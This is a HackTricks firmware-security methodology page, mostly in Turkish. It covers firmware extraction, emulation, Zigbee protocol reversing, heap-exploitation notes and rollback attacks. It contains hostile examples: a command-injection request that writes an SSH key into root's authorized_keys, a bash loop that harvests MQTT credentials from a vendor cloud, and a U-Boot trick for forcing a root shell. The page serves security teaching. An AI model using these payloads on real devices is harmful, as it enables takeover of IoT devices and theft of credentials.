# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware, cihazların donanım bileşenleri ile kullanıcıların etkileşime girdiği yazılım arasında iletişimi yönetip kolaylaştırarak doğru şekilde çalışmasını sağlayan temel yazılımdır. Kalıcı bellekte saklanır; böylece cihaz, açıldığı andan itibaren hayati talimatlara erişebilir ve işletim sisteminin başlatılmasına yol açar. Firmware'i incelemek ve potansiyel olarak değiştirmek, security açıklarını tespit etmede kritik bir adımdır.

## **Gathering Information**

**Gathering information**, bir cihazın yapısını ve kullandığı teknolojileri anlamada kritik bir ilk adımdır. Bu süreç, şu konularda veri toplamayı içerir:

- CPU mimarisi ve çalıştırdığı operating system
- Bootloader ayrıntıları
- Donanım yerleşimi ve datasheet'ler
- Codebase metrikleri ve source konumları
- Harici kütüphaneler ve lisans türleri
- Güncelleme geçmişleri ve düzenleyici sertifikalar
- Mimari ve akış diyagramları
- Security değerlendirmeleri ve tespit edilen vulnerabilities

Bu amaçla, **open-source intelligence (OSINT)** araçları son derece değerlidir; ayrıca mevcut open-source software bileşenlerinin manuel ve otomatik inceleme süreçleriyle analiz edilmesi de önemlidir. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, potansiyel sorunları bulmak için kullanılabilecek ücretsiz static analysis sunar.

## **Acquiring the Firmware**

Firmware elde etmek, her biri kendi karmaşıklık seviyesine sahip çeşitli yollarla yapılabilir:

- Kaynaktan (**doğrudan**) almak (geliştiriciler, üreticiler)
- Verilen talimatlardan **build** etmek
- Resmi support sitelerinden **download** etmek
- Barındırılan firmware dosyalarını bulmak için **Google dork** sorguları kullanmak
- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla **cloud storage**'a doğrudan erişmek
- **Updates**'i man-in-the-middle teknikleriyle yakalamak
- **UART**, **JTAG** veya **PICit** gibi bağlantılar üzerinden cihazdan **extract** etmek
- Cihaz iletişimi içindeki update isteklerini **sniffing** ile yakalamak
- **Hardcoded update endpoints**'i tespit edip kullanmak
- Bootloader veya ağdan **dumping** yapmak
- Diğer tüm yöntemler başarısız olursa, uygun donanım araçları kullanarak depolama yongasını **remove and read** etmek

### UART-only logs: force a root shell via U-Boot env in flash

If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:

1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
3. Reflash only the env partition and reboot; a shell should appear on UART.

This is useful on embedded devices where the bootloader shell is disabled but the env partition is writable via external flash access.

## Analyzing the firmware

Artık **firmware'e sahipsiniz**, onunla nasıl ilgilenmeniz gerektiğini anlamak için hakkında bilgi çıkarmanız gerekir. Bunun için kullanabileceğiniz farklı araçlar:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Eğer bu araçlarla fazla bir şey bulamazsan, görüntünün **entropy** değerini `binwalk -E <bin>` ile kontrol et; düşük entropy varsa, şifrelenmiş olması pek olası değildir. Yüksek entropy varsa, muhtemelen şifrelenmiştir (veya bir şekilde sıkıştırılmıştır).

Ayrıca, bu araçları firmware içine gömülü **files** çıkarmak için kullanabilirsin:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ya da dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kullanabilirsin.

### Getting the Filesystem

Önceki yorumlu araçlarla `binwalk -ev <bin>` komutunu kullanmış olmalısın ve **filesystem**'i çıkarmış olmalısın.\
Binwalk genellikle bunu **filesystem türüyle aynı adı taşıyan bir klasör** içine çıkarır; bu klasör çoğunlukla şunlardan biri olur: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Bazen binwalk, imzalarında filesystem için gerekli magic byte'ı bulundurmaz. Bu durumlarda, binwalk ile filesystem'in offset değerini bulup sıkıştırılmış filesystem'i binary'den carve et ve aşağıdaki adımları kullanarak filesystem'i türüne göre **manuel olarak çıkar**.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Aşağıdaki **dd command** komutunu çalıştırarak Squashfs filesystem’i carve edin.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatif olarak, aşağıdaki komut da çalıştırılabilir.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs için (yukarıdaki örnekte kullanıldı)

`$ unsquashfs dir.squashfs`

Dosyalar sonrasında "`squashfs-root`" dizininde olacaktır.

- CPIO archive dosyaları

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 filesystems için

`$ jefferson rootfsfile.jffs2`

- NAND flash ile ubifs filesystems için

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware Analizi

Firmware elde edildikten sonra, yapısını ve olası vulnerabilities anlamak için onu incelemek önemlidir. Bu süreç, firmware image içinden değerli verileri analiz etmek ve çıkarmak için çeşitli tools kullanmayı içerir.

### Initial Analysis Tools

Binary dosyanın (<bin> olarak anılır) ilk incelemesi için bir dizi komut sağlanmıştır. Bu komutlar file types belirlemeye, strings çıkarmaya, binary data analiz etmeye ve partition ile filesystem detaylarını anlamaya yardımcı olur:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Görüntünün şifreleme durumunu değerlendirmek için, **entropy** `binwalk -E <bin>` ile kontrol edilir. Düşük entropy, şifreleme eksikliğine işaret ederken, yüksek entropy olası şifreleme veya compression gösterir.

**embedded files** çıkarmak için, **file-data-carving-recovery-tools** dokümantasyonu ve dosya incelemesi için **binvis.io** gibi araçlar ve kaynaklar önerilir.

### Filesystem'i Çıkarmak

`binwalk -ev <bin>` kullanarak, genellikle filesystem çıkarılabilir; çoğu zaman filesystem türünün adını taşıyan bir directory içine (ör. squashfs, ubifs) alınır. Ancak, magic bytes eksik olduğu için **binwalk** filesystem türünü tanıyamazsa, manuel extraction gerekir. Bu işlem, filesystem'in offset'ini bulmak için `binwalk` kullanmayı, ardından `dd` komutuyla filesystem'i carve out etmeyi içerir:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Daha sonra, dosya sistemi türüne bağlı olarak (örn. squashfs, cpio, jffs2, ubifs), içeriği manuel olarak çıkarmak için farklı komutlar kullanılır.

### Dosya Sistemi Analizi

Dosya sistemi çıkarıldıktan sonra, güvenlik açıkları için arama başlar. Güvensiz network daemons, hardcoded credentials, API endpoints, update server işlevleri, derlenmemiş kod, startup scripts ve offline analiz için derlenmiş binaries üzerinde durulur.

İncelenmesi gereken **başlıca konumlar** ve **öğeler** şunları içerir:

- Kullanıcı credentials için **etc/shadow** ve **etc/passwd**
- **etc/ssl** içindeki SSL sertifikaları ve anahtarlar
- Olası vulnerabilities için configuration ve script dosyaları
- Daha fazla analiz için embedded binaries
- Yaygın IoT device web servers ve binaries

Dosya sistemi içinde hassas bilgi ve vulnerabilities ortaya çıkarmaya yardımcı olan birkaç tool vardır:

- Hassas bilgi araması için [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ve [**Firmwalker**](https://github.com/craigz28/firmwalker)
- Kapsamlı firmware analysis için [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- Static ve dynamic analysis için [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ve [**EMBA**](https://github.com/e-m-b-a/emba)

### Derlenmiş Binaries Üzerinde Security Checks

Dosya sisteminde bulunan hem source code hem de derlenmiş binaries, vulnerabilities açısından incelenmelidir. Unix binaries için **checksec.sh** ve Windows binaries için **PESecurity** gibi tools, exploitable olabilecek korunmasız binaries'leri belirlemeye yardımcı olur.

## Türetilmiş URL token'ları aracılığıyla cloud config ve MQTT credentials toplama

Birçok IoT hub, her cihaz için olan configuration bilgisini şu benzer bir cloud endpoint'ten çeker:

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analysis sırasında `<token>` değerinin, cihaz ID'sinden hardcoded secret kullanılarak yerelde türetildiğini bulabilirsiniz; örneğin:

- token = MD5( deviceId || STATIC_KEY ) ve uppercase hex olarak temsil edilir

Bu tasarım, deviceId ve STATIC_KEY değerini öğrenen herkesin URL'yi yeniden oluşturup cloud config'i çekebilmesini sağlar; bu da sıklıkla plaintext MQTT credentials ve topic prefix'lerini açığa çıkarır.

Pratik iş akışı:

1) UART boot logs içinden deviceId çıkarın

- 3.3V UART adapter (TX/RX/GND) bağlayın ve logs yakalayın:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- cloud config URL pattern ve broker adresini yazdıran satırları arayın, örneğin:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Firmware'den STATIC_KEY ve token algoritmasını kurtar

- Binaries'leri Ghidra/radare2 içine yükleyin ve config path'i ("/pf/") veya MD5 kullanımını arayın.
- Algoritmayı doğrulayın (örn. MD5(deviceId||STATIC_KEY)).
- Token'ı Bash içinde türetin ve digest'i uppercase yapın:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Cloud config ve MQTT credentials topla

- URL'yi oluştur ve curl ile JSON çek; secrets'leri çıkarmak için jq ile parse et:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Düz metin MQTT ve zayıf topic ACL'lerini kötüye kullanın (varsa)

- Kurtarılan kimlik bilgilerini kullanarak maintenance topic'lerine abone olun ve hassas olayları arayın:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Tahmin edilebilir device ID’lerini enumerate et (ölçekli olarak, authorization ile)

- Birçok ecosystem, vendor OUI/product/type byte’larını ve ardından sequential bir suffix’i gömer.
- Aday ID’leri iterate edebilir, token’ları derive edebilir ve configs’i programmatically fetch edebilirsin:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notlar
- Toplu enumeration girişiminde bulunmadan önce her zaman açık yetkilendirme alın.
- Mümkün olduğunda, hedef donanımı değiştirmeden secrets kurtarmak için emülasyon veya static analysis tercih edin.


Firmware emülasyon süreci, bir cihazın çalışmasının ya da tek bir programın **dynamic analysis** yapılmasını sağlar. Bu yaklaşım, donanım veya architecture bağımlılıkları nedeniyle zorluklarla karşılaşabilir; ancak root filesystem’i veya belirli binaries’i, Raspberry Pi gibi eşleşen architecture ve endianness’e sahip bir cihaza ya da önceden oluşturulmuş bir virtual machine’e aktarmak, daha fazla test yapmayı kolaylaştırabilir.

### Emulating Individual Binaries

Tek tek programları incelemek için, programın endianness ve CPU architecture bilgisini belirlemek çok önemlidir.

#### Example with MIPS Architecture

Bir MIPS architecture binary’sini emulate etmek için şu komut kullanılabilir:
```bash
file ./squashfs-root/bin/busybox
```
Ve gerekli emülasyon araçlarını kurmak için:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
MIPS (big-endian) için `qemu-mips` kullanılır ve little-endian binary'ler için `qemu-mipsel` tercih edilir.

#### ARM Architecture Emulation

ARM binary'ler için süreç benzerdir; emulation için `qemu-arm` emulator kullanılır.

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) ve benzeri tools, tam firmware emulation sürecini kolaylaştırır, süreci otomatikleştirir ve dynamic analysis'a yardımcı olur.

## Dynamic Analysis in Practice

Bu aşamada analysis için gerçek ya da emulated device environment kullanılır. OS ve filesystem üzerinde shell access'i korumak önemlidir. Emulation donanım etkileşimlerini kusursuz biçimde taklit etmeyebilir; bu nedenle zaman zaman emulation yeniden başlatılabilir. Analysis, filesystem'i yeniden incelemeli, exposed webpages ve network services üzerinde exploit uygulamalı ve bootloader vulnerabilities'larını keşfetmelidir. Firmware integrity tests, olası backdoor vulnerabilities'larını belirlemek için kritiktir.

## Runtime Analysis Techniques

Runtime analysis, gdb-multiarch, Frida ve Ghidra gibi tools kullanarak bir process ya da binary ile onun çalışma ortamında etkileşim kurmayı, breakpoint'ler ayarlamayı ve fuzzing ile diğer techniques aracılığıyla vulnerabilities tespit etmeyi içerir.

Tam bir debugger olmayan embedded target'lar için, **statik olarak bağlanmış bir `gdbserver` kopyalayın** cihaza ve uzaktan attach edin:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

IoT hub’larda RF stack çoğu zaman bir **radio MCU** ile bir Linux userland process arasında bölünür. Faydalı bir workflow, şu yolu map etmektir:

1. havadaki **RF frame**
2. radio MCU üzerindeki **controller-side parser**
3. Linux’a iletilen **serial/UART text veya TLV protocol** (örneğin `/dev/tty*`)
4. ana daemon içindeki **application dispatcher**
5. **protocol-specific handler / state machine**

Bu mimari, tek bir tersine mühendislik hedefi yerine iki hedef oluşturur. Controller binary radio frames’i `Group,Command,arg1,arg2,...` gibi textual bir protocol’e dönüştürüyorsa, şunları geri kazan:

- **message groups** ve dispatch tables
- Hangi mesajların **network**’ten, hangilerinin controller’ın kendisinden gelebileceği
- Tam **manufacturer-specific discriminator fields** (örneğin Zigbee `manufacturer_code` ve custom `cluster_command`)
- Hangi handler’ların yalnızca **commissioning**, discovery veya firmware/model download aşamalarında erişilebilir olduğu

Zigbee özelinde, pairing trafiğini capture et ve hedefin hâlâ varsayılan **Link Key** `ZigBeeAlliance09`’a mı dayandığını kontrol et. Eğer öyleyse, commissioning trafiğini sniff etmek **Network Key**’i açığa çıkarabilir. Zigbee 3.0 install codes bu exposure’ı azaltır, bu yüzden test edilen device’ın bunları gerçekten enforce edip etmediğini not et.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands çoğu zaman standardize edilmiş clusters’tan daha iyi bir hedeftir çünkü **custom parsing code** ve daha az test edilmiş validation’a sahip internal **FSMs**’lere beslenirler.

Pratik workflow:

- Command dispatcher’ı reverse et, **vendor-only handler**’ı bulana kadar ilerle.
- **FSM state**, **event**, **check**, **action** ve **next-state** tables’ı geri kazan.
- Otomatik olarak ilerleyen **transitional states** ile retry/error branches’i belirle; bunlar sonunda attacker-controlled state’i reset eder veya free eder.
- Buggy handler’ın her zaman erişilebilir olduğunu varsaymak yerine, vulnerable state’e koymak için hangi meşru protocol exchange’lerin gerektiğini doğrula.

Zamanlama hassasiyeti olan protocols için, Python framework’ünden packet replay çok yavaş olabilir. Daha güvenilir bir yaklaşım, vendor-grade stack ile gerçek hardware üzerinde meşru bir device emulate etmektir (örneğin **nRF52840**); böylece doğru **endpoints**, **attributes** ve commissioning timing’i açığa çıkarabilirsin.

### Fragmented-download bug class in embedded daemons

Yinelenen bir firmware bug class, **fragmented blob/model/configuration downloads** içinde görülür:

1. **first fragment** (`offset == 0`) `ctx->total_size` değerini saklar ve `malloc(total_size)` yapar.
2. Sonraki fragment’lar yalnızca saldırganın kontrol ettiği **packet-local** field’ları doğrular; örneğin `packet_total_size >= offset + chunk_len`.
3. Copy işlemi `memcpy(&ctx->buffer[offset], chunk, chunk_len)` kullanır ve **original allocated size** ile karşılaştırma yapmaz.

Bu, saldırgana şunları göndermesine izin verir:

- Küçük bir heap allocation zorlamak için **small** declared total size’a sahip, geçerli bir ilk fragment.
- Daha sonra **expected offset** ile ama daha büyük `chunk_len` içeren bir fragment.
- Fresh checks’i geçen ama yine de başlangıçta allocated buffer’ı overflow eden forged packet-local size.

Vulnerable path commissioning logic’in arkasındaysa, exploitation malformed fragments göndermeden önce target’ı beklenen model-download veya blob-download state’ine sokacak yeterli **device emulation** içermelidir.

### Protocol-driven `free()` triggers

Embedded daemons içinde heap metadata exploitation’ı tetiklemenin en kolay yolu çoğu zaman "cleanup’ı beklemek" değil, **protocol’s own error handling**’ini zorlamaktır:

- FSM’yi **retry** veya **error** state’lerine itmek için malformed follow-up fragments gönder.
- Retry threshold’u aş, böylece daemon **resets context** yapar ve corrupted buffer’ı free eder.
- Process unrelated reasons yüzünden crash olmadan önce allocator-side primitives’ı tetiklemek için bu öngörülebilir `free()`’yi kullan.

Bu özellikle embedded Linux’taki **musl/uClibc/dlmalloc-like** allocators’a karşı kullanışlıdır; chunk metadata’yı bozmak unlink/unbin logic’i bir write primitive’e çevirebilir. Stabil bir pattern, gerçek bin pointer’larını hemen bozup process’i crash ettirmek yerine, allocator traversal’ı overflowed buffer içinde staged fake chunks’a yönlendirmek için bir **size field**’ı bozmak olur.

## Binary Exploitation and Proof-of-Concept

Belirlenen vulnerabilities için bir PoC geliştirmek, hedef architecture’ı derinlemesine anlamayı ve daha düşük seviyeli dillerde programlamayı gerektirir. Embedded systems içindeki binary runtime protections nadirdir, ancak mevcut olduklarında Return Oriented Programming (ROP) gibi teknikler gerekebilir.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc, glibc’ye benzer fastbins kullanır. Daha sonraki büyük bir allocation `__malloc_consolidate()` tetikleyebilir, bu yüzden fake chunk’ın kontrollerden geçmesi gerekir (makul size, `fd = 0` ve çevredeki chunk’ların "in use" görünmesi).
- **Non-PIE binaries under ASLR:** ASLR etkin olsa da ana binary **non-PIE** ise, binary içi `.data/.bss` adresleri stabildir. Fastbin allocation’ı bir **function pointer table** üzerine düşürmek için zaten valid heap chunk header’a benzeyen bir bölgeyi hedefleyebilirsin.
- **Parser-stopping NUL:** JSON parse edilirken payload içindeki bir `\x00`, stack pivot/ROP chain için trailing attacker-controlled bytes’ı korurken parsing’i durdurabilir.
- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`, `lseek()` ve `write()` çağıran bir ROP chain, bilinen bir mapping içine executable shellcode yerleştirip ona jump yapabilir.

## Prepared Operating Systems for Firmware Analysis

[AttifyOS](https://github.com/adi0x90/attifyos) ve [EmbedOS](https://github.com/scriptingxss/EmbedOS) gibi operating systems, gerekli tools ile donatılmış, firmware security testing için önceden yapılandırılmış environments sağlar.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) devices üzerinde security assessment ve penetration testing yapmana yardımcı olmak için tasarlanmış bir distro’dur. Gerekli tüm tools yüklü, önceden yapılandırılmış bir environment sunarak çok zaman kazandırır.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Firmware security testing tools ile önceden yüklenmiş, Ubuntu 18.04 tabanlı embedded security testing operating system.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Bir vendor firmware images için cryptographic signature checks uygulasa bile, **version rollback (downgrade) protection** çoğu zaman eklenmez. Boot- veya recovery-loader yalnızca gömülü bir public key ile signature’ı doğruluyor, ancak flash edilen image’ın *version*’ını (veya monotonic counter’ını) karşılaştırmıyorsa, saldırgan geçerli bir signature taşıyan daha eski, vulnerable bir firmware’i meşru biçimde yükleyebilir ve böylece yamalanmış vulnerabilities’ı yeniden ortaya çıkarabilir.

Tipik attack workflow:

1. **Older signed image elde et**
* Bunu vendor’ın public download portalından, CDN’sinden veya support site’ından al.
* Companion mobile/desktop applications içinden çıkar (örneğin bir Android APK içinde `assets/firmware/` altında).
* VirusTotal, internet archive’leri, forumlar vb. üçüncü taraf repositories’den al.
2. **Image’ı device’a upload et veya serve et** herhangi bir exposed update channel üzerinden:
* Web UI, mobile-app API, USB, TFTP, MQTT, vb.
* Birçok consumer IoT device, Base64-encoded firmware blobs kabul eden, server-side decode eden ve recovery/upgrade tetikleyen *unauthenticated* HTTP(S) endpoints açığa çıkarır.
3. Downgrade’den sonra, daha yeni release’te yamalanmış bir vulnerability exploit et (örneğin sonradan eklenen bir command-injection filter).
4. İsteğe bağlı olarak latest image’ı geri flash et veya persistence kazanıldıktan sonra detection’dan kaçınmak için updates’i disable et.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Savunmasız (downgraded) firmware’de, `md5` parametresi sanitisation yapılmadan doğrudan bir shell command içine birleştirilir; bu da keyfi commands enjekte edilmesine izin verir (burada – SSH key-based root access’i etkinleştirmek). Sonraki firmware sürümleri basit bir character filter ekledi, ancak downgrade protection olmaması bu fix’i etkisiz kılar.

### Mobile Apps’ten Firmware Çıkarmak

Birçok vendor, cihazı Bluetooth/Wi-Fi üzerinden update edebilmesi için companion mobile applications içinde tam firmware images paketler. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi paths altında şifresiz olarak saklanır. `apktool`, `ghidra` veya düz `unzip` gibi tools, fiziksel hardware’e dokunmadan signed images çıkarmanıza izin verir.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### A/B slot tasarımlarında updater-only anti-rollback bypass

Bazı vendor'lar anti-downgrade **ratchet** uygular, ancak bunu yalnızca *updater* mantığının içinde yapar (örneğin CAN üzerinden bir UDS routine, bir recovery command veya bir userspace OTA agent). Eğer **bootloader** daha sonra yalnızca image signature/CRC kontrol eder ve partition table veya slot metadata’ya güvenirse, rollback protection yine bypass edilebilir.

Tipik zayıf tasarım:

- Firmware metadata, hem bir version descriptor hem de bir **security ratchet** / monotonic counter içerir.
- Updater, image ratchet’i persistent storage’da tutulan bir değerle karşılaştırır ve daha eski signed images’ı reddeder.
- Bootloader bu ratchet’i **parse etmez** ve seçilen slotu boot etmeden önce yalnızca header, CRC ve signature doğrular.
- Slot activation, partition table’da veya her slot için ayrı bir generation counter’da ayrı olarak saklanır ve doğrulanan exact firmware digest’i ile **cryptographically bound** değildir.

Bu, dual-slot sistemlerde bir **validate-one-image / boot-another-image** primitive’i oluşturur. Saldırgan, updater’ı current signed bir image kullanarak slot B’yi sonraki boot target olarak işaretlemeye zorlayabilir ve daha sonra reboot öncesinde slot B’yi overwrite edebilirse, bootloader yine downgraded image’ı boot edebilir; çünkü yalnızca zaten commit edilmiş slot metadata’sına güvenir.

Yaygın abuse pattern:

1. Passive slot’a **current signed** firmware yükle ve normal validation/switch routine’i çalıştırarak layout’un o slotu next active olarak işaretlemesini sağla.
2. Henüz reboot etme. Aynı session içinde slot-preparation/erase routine’ine yeniden gir.
3. Stale boot-state veya stale slot-selection logic’i abuse ederek updater’ın az önce promoted edilen **aynı physical slot**’u erase etmesini sağla.
4. O slota **older but still signed** firmware yaz.
5. Ratchet’i zorlayan validation routine’ini atla ve doğrudan reboot et.
6. Bootloader promoted slot’u seçer, yalnızca signature/integrity doğrular ve eski image’ı boot eder.

A/B update implementations’ı reverse ederken bakılacak şeyler:

- Successful switch sonrası refresh edilmeyen **boot-time flags**’ten türetilen slot selection.
- **Current committed layout** yerine stale state’e göre bir slot’u erase eden `prepare_passive_slot()`-style routine.
- Sadece bir **generation counter** / active flag artıran ve validated image hash saklamayan bir `part_write_layout()`-style function.
- Userspace veya updater code içinde uygulanan, ancak ROM / bootloader / secure boot stages içinde olmayan ratchet checks.
- Slot content silinip yeniden yazılsa bile slot’u bootable olarak bırakıp bırakan erase veya recovery routines.

### Update Logic’i Değerlendirme Checklist’i

* *update endpoint*’in transport/authentication kısmı yeterince korunuyor mu (TLS + authentication)?
* Device, flashing öncesi **version numbers** veya **monotonic anti-rollback counter** karşılaştırıyor mu?
* Image, secure boot chain içinde doğrulanıyor mu (ör. ROM code tarafından checked signatures)?
* **Bootloader**, yalnızca signature/CRC kontrol etmek yerine updater ile aynı ratchet’i enforce ediyor mu?
* Slot activation metadata, validated firmware digest/version ile **bound** mu, yoksa promotion sonrası slot modify edilebiliyor mu?
* Slot switch başarılı olduktan sonra device reboot’a zorlanıyor mu, yoksa sonraki update/erase routines aynı session içinde hâlâ erişilebilir mi?
* Userland code ek sanity checks yapıyor mu (ör. allowed partition map, model number)?
* *Partial* veya *backup* update flows aynı validation logic’i yeniden kullanıyor mu?

> 💡  Eğer yukarıdakilerden herhangi biri eksikse, platform muhtemelen rollback attacks’e karşı savunmasızdır.

## Practice için vulnerable firmware

Firmware içinde vulnerability keşfetmeye pratik yapmak için, başlangıç noktası olarak aşağıdaki vulnerable firmware projects’i kullanın.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
